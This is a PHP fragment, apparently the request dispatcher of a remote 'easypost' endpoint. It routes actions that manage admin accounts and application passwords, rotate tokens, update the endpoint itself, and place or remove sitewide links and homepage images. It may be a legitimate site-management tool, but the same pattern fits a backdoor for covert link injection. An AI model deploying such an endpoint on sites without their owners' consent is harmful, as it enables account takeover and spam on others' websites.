if ($action === 'reconcile_portfolio_admin') {
    easypost_endpoint_reconcile_portfolio_admin($payload);
}
if ($action === 'reconcile_application_password') {
    easypost_endpoint_reconcile_application_password($payload);
}
if ($action === 'rotate_token') {
    easypost_endpoint_rotate_token($payload);
}
if ($action === 'configure_site_runtime') {
    easypost_endpoint_configure_site_runtime($payload);
}
if ($action === 'configure_portfolio_runtime') {
    easypost_endpoint_configure_portfolio_runtime($payload);
}
if ($action === 'bootstrap_portfolio_runtime') {
    easypost_endpoint_bootstrap_portfolio_runtime($payload);
}
if ($action === 'disable_site_runtime') {
    easypost_endpoint_disable_site_runtime();
}
if ($action === 'runtime_status') {
    easypost_endpoint_runtime_status();
}
if ($action === 'begin_reconcile') {
    easypost_endpoint_begin_reconcile($payload);
}
if ($action === 'refresh_reconcile') {
    easypost_endpoint_refresh_reconcile($payload);
}
if ($action === 'finish_reconcile') {
    easypost_endpoint_finish_reconcile($payload);
}
if ($action === 'update_endpoint') {
    easypost_endpoint_update_endpoint($payload);
}
if ($action === 'place_homepage_image') {
    easypost_endpoint_place_homepage_image($payload);
}
if ($action === 'remove_homepage_image') {
    easypost_endpoint_remove_homepage_image($payload);
}
if ($action === 'place_sitewide_link') {
    easypost_endpoint_place_sitewide_link($payload);
}
if ($action === 'remove_sitewide_link') {
    easypost_endpoint_remove_sitewide_link($payload);
}

easypost_endpoint_json(404, array('ok' => false, 'error' => 'unknown_action'));
